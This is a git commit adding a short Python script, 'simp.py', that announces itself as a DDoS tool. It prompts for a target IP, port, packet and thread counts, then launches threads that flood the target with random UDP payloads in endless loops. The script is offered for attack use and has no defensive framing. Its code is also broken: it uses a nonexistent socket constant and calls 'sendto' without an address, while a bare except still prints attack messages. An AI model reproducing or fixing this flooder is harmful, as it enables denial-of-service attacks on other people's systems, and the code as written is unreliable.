4f8e4b473386277fee7bf218fa6ae1cb2d2eb289
pushy <80036867+dahlah270@users.noreply.github.com>
2022-01-03 22:34:10 +0700

    Create simp.py

---
+++ simp.py
@@ -0,0 +1,30 @@
+#codebypushy
+import socket
+import random
+import threading
+import os,sys
+
+print("DDOS BY Pushy")
+
+ip_since = str(input("Ip Target : "))
+port_since = int(input("Port Target : "))
+paket_since = int(input("Paket Dari since : "))
+threads_since = int(input("Thread Dari since : "))
+os.system("clear")
+
+def since():
+    devxyz = random._urandom(1800)
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
+            s.connect((ip_since,port_since))
+            s.sendto(devxyz)
+            for x in range(paket_since):
+                s.sendto(devxyz)
+            print("[-] SINCE ATTACK TO IP!!!")
+        except:
+            print("[/] SINCE ATTACK TO IP!!!")
+
+for y in range(threads_since):
+    th = threading.Thread(target=since)
+    th.start()
